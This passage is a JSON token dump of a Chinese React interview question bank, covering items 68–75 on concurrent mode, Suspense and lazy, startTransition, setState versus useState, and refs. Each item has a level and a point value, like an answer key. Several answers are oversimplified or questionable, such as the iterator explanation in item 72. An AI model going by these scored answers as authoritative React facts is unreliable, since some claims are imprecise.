API可以简化代码结构，避免prop drilling（属性穿透）的问题，并提高组件的复用性。","tokens":[{"type":"text","raw":"使用Context API可以简化代码结构，避免prop drilling（属性穿透）的问题，并提高组件的复用性。","text":"使用Context API可以简化代码结构，避免prop drilling（属性穿透）的问题，并提高组件的复用性。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 68. React18中引入的并发模式是什么，它带来了哪些改进\\n\\n","depth":2,"text":"68. React18中引入的并发模式是什么，它带来了哪些改进","tokens":[{"type":"text","raw":"68. React18中引入的并发模式是什么，它带来了哪些改进","text":"68. React18中引入的并发模式是什么，它带来了哪些改进","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- React18中引入的并发模式是一种新的渲染策略，它允许React在渲染过程中中断和恢复工作，以便更好地响应用户输入和其他高优先级任务。\\n\\n- 通过并发模式，React可以更好地管理资源的分配和使用，提高应用的响应性和性能。\\n\\n- 此外，并发模式还为React的未来扩展提供了基础，比如支持更复杂的动画和交互效果。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React18中引入的并发模式是一种新的渲染策略，它允许React在渲染过程中中断和恢复工作，以便更好地响应用户输入和其他高优先级任务。\\n\\n","task":false,"loose":true,"text":"React18中引入的并发模式是一种新的渲染策略，它允许React在渲染过程中中断和恢复工作，以便更好地响应用户输入和其他高优先级任务。\\n","tokens":[{"type":"text","raw":"React18中引入的并发模式是一种新的渲染策略，它允许React在渲染过程中中断和恢复工作，以便更好地响应用户输入和其他高优先级任务。\\n","text":"React18中引入的并发模式是一种新的渲染策略，它允许React在渲染过程中中断和恢复工作，以便更好地响应用户输入和其他高优先级任务。","tokens":[{"type":"text","raw":"React18中引入的并发模式是一种新的渲染策略，它允许React在渲染过程中中断和恢复工作，以便更好地响应用户输入和其他高优先级任务。","text":"React18中引入的并发模式是一种新的渲染策略，它允许React在渲染过程中中断和恢复工作，以便更好地响应用户输入和其他高优先级任务。","escaped":false}]}]},{"type":"list_item","raw":"- 通过并发模式，React可以更好地管理资源的分配和使用，提高应用的响应性和性能。\\n\\n","task":false,"loose":true,"text":"通过并发模式，React可以更好地管理资源的分配和使用，提高应用的响应性和性能。\\n","tokens":[{"type":"text","raw":"通过并发模式，React可以更好地管理资源的分配和使用，提高应用的响应性和性能。\\n","text":"通过并发模式，React可以更好地管理资源的分配和使用，提高应用的响应性和性能。","tokens":[{"type":"text","raw":"通过并发模式，React可以更好地管理资源的分配和使用，提高应用的响应性和性能。","text":"通过并发模式，React可以更好地管理资源的分配和使用，提高应用的响应性和性能。","escaped":false}]}]},{"type":"list_item","raw":"- 此外，并发模式还为React的未来扩展提供了基础，比如支持更复杂的动画和交互效果。","task":false,"loose":true,"text":"此外，并发模式还为React的未来扩展提供了基础，比如支持更复杂的动画和交互效果。","tokens":[{"type":"text","raw":"此外，并发模式还为React的未来扩展提供了基础，比如支持更复杂的动画和交互效果。","text":"此外，并发模式还为React的未来扩展提供了基础，比如支持更复杂的动画和交互效果。","tokens":[{"type":"text","raw":"此外，并发模式还为React的未来扩展提供了基础，比如支持更复杂的动画和交互效果。","text":"此外，并发模式还为React的未来扩展提供了基础，比如支持更复杂的动画和交互效果。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 69. React的Suspense组件和lazy函数是如何支持代码拆分的\\n\\n","depth":2,"text":"69. React的Suspense组件和lazy函数是如何支持代码拆分的","tokens":[{"type":"text","raw":"69. React的Suspense组件和lazy函数是如何支持代码拆分的","text":"69. React的Suspense组件和lazy函数是如何支持代码拆分的","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- React的Suspense组件和lazy函数是React支持代码拆分的重要工具。\\n\\n- lazy函数允许你动态地导入React组件，这意味着你可以将组件的代码分割到单独的文件中，并在需要时再进行加载。\\n\\n- Suspense组件则用于指定加载指示器（如加载动画或占位符），以便在组件加载完成之前向用户展示一些反馈。\\n\\n- 通过结合使用lazy函数和Suspense组件，你可以实现按需加载组件，提高应用的初始加载速度和性能。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React的Suspense组件和lazy函数是React支持代码拆分的重要工具。\\n\\n","task":false,"loose":true,"text":"React的Suspense组件和lazy函数是React支持代码拆分的重要工具。\\n","tokens":[{"type":"text","raw":"React的Suspense组件和lazy函数是React支持代码拆分的重要工具。\\n","text":"React的Suspense组件和lazy函数是React支持代码拆分的重要工具。","tokens":[{"type":"text","raw":"React的Suspense组件和lazy函数是React支持代码拆分的重要工具。","text":"React的Suspense组件和lazy函数是React支持代码拆分的重要工具。","escaped":false}]}]},{"type":"list_item","raw":"- lazy函数允许你动态地导入React组件，这意味着你可以将组件的代码分割到单独的文件中，并在需要时再进行加载。\\n\\n","task":false,"loose":true,"text":"lazy函数允许你动态地导入React组件，这意味着你可以将组件的代码分割到单独的文件中，并在需要时再进行加载。\\n","tokens":[{"type":"text","raw":"lazy函数允许你动态地导入React组件，这意味着你可以将组件的代码分割到单独的文件中，并在需要时再进行加载。\\n","text":"lazy函数允许你动态地导入React组件，这意味着你可以将组件的代码分割到单独的文件中，并在需要时再进行加载。","tokens":[{"type":"text","raw":"lazy函数允许你动态地导入React组件，这意味着你可以将组件的代码分割到单独的文件中，并在需要时再进行加载。","text":"lazy函数允许你动态地导入React组件，这意味着你可以将组件的代码分割到单独的文件中，并在需要时再进行加载。","escaped":false}]}]},{"type":"list_item","raw":"- Suspense组件则用于指定加载指示器（如加载动画或占位符），以便在组件加载完成之前向用户展示一些反馈。\\n\\n","task":false,"loose":true,"text":"Suspense组件则用于指定加载指示器（如加载动画或占位符），以便在组件加载完成之前向用户展示一些反馈。\\n","tokens":[{"type":"text","raw":"Suspense组件则用于指定加载指示器（如加载动画或占位符），以便在组件加载完成之前向用户展示一些反馈。\\n","text":"Suspense组件则用于指定加载指示器（如加载动画或占位符），以便在组件加载完成之前向用户展示一些反馈。","tokens":[{"type":"text","raw":"Suspense组件则用于指定加载指示器（如加载动画或占位符），以便在组件加载完成之前向用户展示一些反馈。","text":"Suspense组件则用于指定加载指示器（如加载动画或占位符），以便在组件加载完成之前向用户展示一些反馈。","escaped":false}]}]},{"type":"list_item","raw":"- 通过结合使用lazy函数和Suspense组件，你可以实现按需加载组件，提高应用的初始加载速度和性能。","task":false,"loose":true,"text":"通过结合使用lazy函数和Suspense组件，你可以实现按需加载组件，提高应用的初始加载速度和性能。","tokens":[{"type":"text","raw":"通过结合使用lazy函数和Suspense组件，你可以实现按需加载组件，提高应用的初始加载速度和性能。","text":"通过结合使用lazy函数和Suspense组件，你可以实现按需加载组件，提高应用的初始加载速度和性能。","tokens":[{"type":"text","raw":"通过结合使用lazy函数和Suspense组件，你可以实现按需加载组件，提高应用的初始加载速度和性能。","text":"通过结合使用lazy函数和Suspense组件，你可以实现按需加载组件，提高应用的初始加载速度和性能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 70. React18中引入了新的startTransition API，说说它的作用以及如何使用\\n\\n","depth":2,"text":"70. React18中引入了新的startTransition API，说说它的作用以及如何使用","tokens":[{"type":"text","raw":"70. React18中引入了新的startTransition API，说说它的作用以及如何使用","text":"70. React18中引入了新的startTransition API，说说它的作用以及如何使用","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- React18中引入的startTransition API用于标记那些可能需要一段时间才能完成的更新（例如，从服务器获取数据）。\\n\\n- 这个API允许React将UI的渲染划分为优先级较低的任务和优先级较高的任务。\\n\\n- 通过调用startTransition并传入一个回调函数，我们可以告诉React：“这个更新可以稍后完成，先处理其他更紧急的事情。”\\n\\n- 这使得React能够在等待数据加载时保持响应性，提供更好的用户体验。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React18中引入的startTransition API用于标记那些可能需要一段时间才能完成的更新（例如，从服务器获取数据）。\\n\\n","task":false,"loose":true,"text":"React18中引入的startTransition API用于标记那些可能需要一段时间才能完成的更新（例如，从服务器获取数据）。\\n","tokens":[{"type":"text","raw":"React18中引入的startTransition API用于标记那些可能需要一段时间才能完成的更新（例如，从服务器获取数据）。\\n","text":"React18中引入的startTransition API用于标记那些可能需要一段时间才能完成的更新（例如，从服务器获取数据）。","tokens":[{"type":"text","raw":"React18中引入的startTransition API用于标记那些可能需要一段时间才能完成的更新（例如，从服务器获取数据）。","text":"React18中引入的startTransition API用于标记那些可能需要一段时间才能完成的更新（例如，从服务器获取数据）。","escaped":false}]}]},{"type":"list_item","raw":"- 这个API允许React将UI的渲染划分为优先级较低的任务和优先级较高的任务。\\n\\n","task":false,"loose":true,"text":"这个API允许React将UI的渲染划分为优先级较低的任务和优先级较高的任务。\\n","tokens":[{"type":"text","raw":"这个API允许React将UI的渲染划分为优先级较低的任务和优先级较高的任务。\\n","text":"这个API允许React将UI的渲染划分为优先级较低的任务和优先级较高的任务。","tokens":[{"type":"text","raw":"这个API允许React将UI的渲染划分为优先级较低的任务和优先级较高的任务。","text":"这个API允许React将UI的渲染划分为优先级较低的任务和优先级较高的任务。","escaped":false}]}]},{"type":"list_item","raw":"- 通过调用startTransition并传入一个回调函数，我们可以告诉React：“这个更新可以稍后完成，先处理其他更紧急的事情。”\\n\\n","task":false,"loose":true,"text":"通过调用startTransition并传入一个回调函数，我们可以告诉React：“这个更新可以稍后完成，先处理其他更紧急的事情。”\\n","tokens":[{"type":"text","raw":"通过调用startTransition并传入一个回调函数，我们可以告诉React：“这个更新可以稍后完成，先处理其他更紧急的事情。”\\n","text":"通过调用startTransition并传入一个回调函数，我们可以告诉React：“这个更新可以稍后完成，先处理其他更紧急的事情。”","tokens":[{"type":"text","raw":"通过调用startTransition并传入一个回调函数，我们可以告诉React：“这个更新可以稍后完成，先处理其他更紧急的事情。”","text":"通过调用startTransition并传入一个回调函数，我们可以告诉React：“这个更新可以稍后完成，先处理其他更紧急的事情。”","escaped":false}]}]},{"type":"list_item","raw":"- 这使得React能够在等待数据加载时保持响应性，提供更好的用户体验。","task":false,"loose":true,"text":"这使得React能够在等待数据加载时保持响应性，提供更好的用户体验。","tokens":[{"type":"text","raw":"这使得React能够在等待数据加载时保持响应性，提供更好的用户体验。","text":"这使得React能够在等待数据加载时保持响应性，提供更好的用户体验。","tokens":[{"type":"text","raw":"这使得React能够在等待数据加载时保持响应性，提供更好的用户体验。","text":"这使得React能够在等待数据加载时保持响应性，提供更好的用户体验。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 71. 类组件的setState和函数组件的useState异同\\n\\n","depth":2,"text":"71. 类组件的setState和函数组件的useState异同","tokens":[{"type":"text","raw":"71. 类组件的setState和函数组件的useState异同","text":"71. 类组件的setState和函数组件的useState异同","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"相同点","text":"相同点","tokens":[{"type":"text","raw":"相同点","text":"相同点","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"都更新视图，底部调用了scheduleUpdateFiber方法，在事件驱动情况下都有批量更新规则。","text":"都更新视图，底部调用了scheduleUpdateFiber方法，在事件驱动情况下都有批量更新规则。","tokens":[{"type":"text","raw":"都更新视图，底部调用了scheduleUpdateFiber方法，在事件驱动情况下都有批量更新规则。","text":"都更新视图，底部调用了scheduleUpdateFiber方法，在事件驱动情况下都有批量更新规则。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"不同点","text":"不同点","tokens":[{"type":"text","raw":"不同点","text":"不同点","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"setState只要调用了就会执行更新；useState会浅比较2次state是否相同","text":"setState只要调用了就会执行更新；useState会浅比较2次state是否相同","tokens":[{"type":"text","raw":"setState只要调用了就会执行更新；useState会浅比较2次state是否相同","text":"setState只要调用了就会执行更新；useState会浅比较2次state是否相同","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"setState有专门监听变化的回调函数；useState只能通过useEffect","text":"setState有专门监听变化的回调函数；useState只能通过useEffect","tokens":[{"type":"text","raw":"setState有专门监听变化的回调函数；useState只能通过useEffect","text":"setState有专门监听变化的回调函数；useState只能通过useEffect","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"setState底层处理上主要是和老的state合并；useState则重新赋值","text":"setState底层处理上主要是和老的state合并；useState则重新赋值","tokens":[{"type":"text","raw":"setState底层处理上主要是和老的state合并；useState则重新赋值","text":"setState底层处理上主要是和老的state合并；useState则重新赋值","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 72. 为什么React组件中 return 一个对象而不是一个元素时会报错\\n\\n","depth":2,"text":"72. 为什么React组件中 return 一个对象而不是一个元素时会报错","tokens":[{"type":"text","raw":"72. 为什么React组件中 return 一个对象而不是一个元素时会报错","text":"72. 为什么React组件中 return 一个对象而不是一个元素时会报错","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"paragraph","raw":"因为对象不具备迭代接口，必须要时原型或者自己身上有[Symbol.iterator]属性才可以，而数组是有迭代接口的，所以可以直接迭代。","text":"因为对象不具备迭代接口，必须要时原型或者自己身上有[Symbol.iterator]属性才可以，而数组是有迭代接口的，所以可以直接迭代。","tokens":[{"type":"text","raw":"因为对象不具备迭代接口，必须要时原型或者自己身上有[Symbol.iterator]属性才可以，而数组是有迭代接口的，所以可以直接迭代。","text":"因为对象不具备迭代接口，必须要时原型或者自己身上有[Symbol.iterator]属性才可以，而数组是有迭代接口的，所以可以直接迭代。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 73. React可以在哪个生命周期访问DOM，在哪个时机访问Ref？\\n\\n","depth":2,"text":"73. React可以在哪个生命周期访问DOM，在哪个时机访问Ref？","tokens":[{"type":"text","raw":"73. React可以在哪个生命周期访问DOM，在哪个时机访问Ref？","text":"73. React可以在哪个生命周期访问DOM，在哪个时机访问Ref？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"访问 DOM： 在 React 中，通常应该遈避免直接操作 DOM，因为 React 采用 Virtual DOM 的方式管理页面渲染。但是，如果确实需要访问真实的 DOM 元素，可以在组件的以下生命周期方法中进行","text":"访问 DOM： 在 React 中，通常应该遈避免直接操作 DOM，因为 React 采用 Virtual DOM 的方式管理页面渲染。但是，如果确实需要访问真实的 DOM 元素，可以在组件的以下生命周期方法中进行","tokens":[{"type":"text","raw":"访问 DOM： 在 React 中，通常应该遈避免直接操作 DOM，因为 React 采用 Virtual DOM 的方式管理页面渲染。但是，如果确实需要访问真实的 DOM 元素，可以在组件的以下生命周期方法中进行","text":"访问 DOM： 在 React 中，通常应该遈避免直接操作 DOM，因为 React 采用 Virtual DOM 的方式管理页面渲染。但是，如果确实需要访问真实的 DOM 元素，可以在组件的以下生命周期方法中进行","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"componentDidMount()：在组件挂载后立即调用。可以在这个生命周期方法中访问和操作 DOM 元素，执行初始化操作等。","text":"componentDidMount()：在组件挂载后立即调用。可以在这个生命周期方法中访问和操作 DOM 元素，执行初始化操作等。","tokens":[{"type":"text","raw":"componentDidMount()：在组件挂载后立即调用。可以在这个生命周期方法中访问和操作 DOM 元素，执行初始化操作等。","text":"componentDidMount()：在组件挂载后立即调用。可以在这个生命周期方法中访问和操作 DOM 元素，执行初始化操作等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"componentDidUpdate(prevProps, prevState)：在组件更新后被调用。可以在此方法中根据更新后的 props 或 state 来访问或操作 DOM 元素。","text":"componentDidUpdate(prevProps, prevState)：在组件更新后被调用。可以在此方法中根据更新后的 props 或 state 来访问或操作 DOM 元素。","tokens":[{"type":"text","raw":"componentDidUpdate(prevProps, prevState)：在组件更新后被调用。可以在此方法中根据更新后的 props 或 state 来访问或操作 DOM 元素。","text":"componentDidUpdate(prevProps, prevState)：在组件更新后被调用。可以在此方法中根据更新后的 props 或 state 来访问或操作 DOM 元素。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"访问 Ref： Ref 是用于访问真实 DOM 节点或 React 组件实例的一种方式。在 React 中，可以在以下时机访问 Ref：","text":"访问 Ref： Ref 是用于访问真实 DOM 节点或 React 组件实例的一种方式。在 React 中，可以在以下时机访问 Ref：","tokens":[{"type":"text","raw":"访问 Ref： Ref 是用于访问真实 DOM 节点或 React 组件实例的一种方式。在 React 中，可以在以下时机访问 Ref：","text":"访问 Ref： Ref 是用于访问真实 DOM 节点或 React 组件实例的一种方式。在 React 中，可以在以下时机访问 Ref：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用 Ref：可以在componentDidMount()、componentDidUpdate() 或事件处理程序中访问 Ref。通过 Ref 可以获取到对应的 DOM 元素或组件实例。","text":"使用 Ref：可以在componentDidMount()、componentDidUpdate() 或事件处理程序中访问 Ref。通过 Ref 可以获取到对应的 DOM 元素或组件实例。","tokens":[{"type":"text","raw":"使用 Ref：可以在componentDidMount()、componentDidUpdate() 或事件处理程序中访问 Ref。通过 Ref 可以获取到对应的 DOM 元素或组件实例。","text":"使用 Ref：可以在componentDidMount()、componentDidUpdate() 或事件处理程序中访问 Ref。通过 Ref 可以获取到对应的 DOM 元素或组件实例。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 74. React为什么要校验Prop？\\n\\n","depth":2,"text":"74. React为什么要校验Prop？","tokens":[{"type":"text","raw":"74. React为什么要校验Prop？","text":"74. React为什么要校验Prop？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"React 中校验 Props 的主要目的是为了确保组件被正确使用并且传入的数据是符合预期的。通过对 Props 进行校验，可以提高代码的可靠性、可维护性和可读性，帮助开发人员尽早发现潜在的问题并减少调试时间。","text":"React 中校验 Props 的主要目的是为了确保组件被正确使用并且传入的数据是符合预期的。通过对 Props 进行校验，可以提高代码的可靠性、可维护性和可读性，帮助开发人员尽早发现潜在的问题并减少调试时间。","tokens":[{"type":"text","raw":"React 中校验 Props 的主要目的是为了确保组件被正确使用并且传入的数据是符合预期的。通过对 Props 进行校验，可以提高代码的可靠性、可维护性和可读性，帮助开发人员尽早发现潜在的问题并减少调试时间。","text":"React 中校验 Props 的主要目的是为了确保组件被正确使用并且传入的数据是符合预期的。通过对 Props 进行校验，可以提高代码的可靠性、可维护性和可读性，帮助开发人员尽早发现潜在的问题并减少调试时间。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"数据完整性和类型安全：Props 校验可以确保组件所需的数据类型和结构是正确的，避免意外的数据类型错误或缺失。这有助于提高代码的稳定性和可靠性。","text":"数据完整性和类型安全：Props 校验可以确保组件所需的数据类型和结构是正确的，避免意外的数据类型错误或缺失。这有助于提高代码的稳定性和可靠性。","tokens":[{"type":"text","raw":"数据完整性和类型安全：Props 校验可以确保组件所需的数据类型和结构是正确的，避免意外的数据类型错误或缺失。这有助于提高代码的稳定性和可靠性。","text":"数据完整性和类型安全：Props 校验可以确保组件所需的数据类型和结构是正确的，避免意外的数据类型错误或缺失。这有助于提高代码的稳定性和可靠性。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"组件复用：通过校验 Props，可以明确指定组件所需的数据格式和限制条件，使其更具通用性和可复用性。其他开发人员在使用组件时能够更容易地理解如何正确传入数据。","text":"组件复用：通过校验 Props，可以明确指定组件所需的数据格式和限制条件，使其更具通用性和可复用性。其他开发人员在使用组件时能够更容易地理解如何正确传入数据。","tokens":[{"type":"text","raw":"组件复用：通过校验 Props，可以明确指定组件所需的数据格式和限制条件，使其更具通用性和可复用性。其他开发人员在使用组件时能够更容易地理解如何正确传入数据。","text":"组件复用：通过校验 Props，可以明确指定组件所需的数据格式和限制条件，使其更具通用性和可复用性。其他开发人员在使用组件时能够更容易地理解如何正确传入数据。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"提供清晰的接口：Props 校验定义了组件的接口规范，使得组件的用法更加清晰明了。开发人员在调用组件时可以清晰地了解需要传入哪些数据，以及这些数据的约束条件。","text":"提供清晰的接口：Props 校验定义了组件的接口规范，使得组件的用法更加清晰明了。开发人员在调用组件时可以清晰地了解需要传入哪些数据，以及这些数据的约束条件。","tokens":[{"type":"text","raw":"提供清晰的接口：Props 校验定义了组件的接口规范，使得组件的用法更加清晰明了。开发人员在调用组件时可以清晰地了解需要传入哪些数据，以及这些数据的约束条件。","text":"提供清晰的接口：Props 校验定义了组件的接口规范，使得组件的用法更加清晰明了。开发人员在调用组件时可以清晰地了解需要传入哪些数据，以及这些数据的约束条件。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"调试和错误检测：当传入的 Props 不符合校验规则时，React 会在开发环境下发出警告信息，帮助开发人员快速定位问题并进行修复，从而提高代码质量和可维护性。","text":"调试和错误检测：当传入的 Props 不符合校验规则时，React 会在开发环境下发出警告信息，帮助开发人员快速定位问题并进行修复，从而提高代码质量和可维护性。","tokens":[{"type":"text","raw":"调试和错误检测：当传入的 Props 不符合校验规则时，React 会在开发环境下发出警告信息，帮助开发人员快速定位问题并进行修复，从而提高代码质量和可维护性。","text":"调试和错误检测：当传入的 Props 不符合校验规则时，React 会在开发环境下发出警告信息，帮助开发人员快速定位问题并进行修复，从而提高代码质量和可维护性。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 75. shouldComponentUpdate有什么用？为什么它很重要？\\n\\n","depth":2,"text":"75. shouldComponentUpdate有什么用？为什么它很重要？","tokens":[{"type":"text","raw":"75. 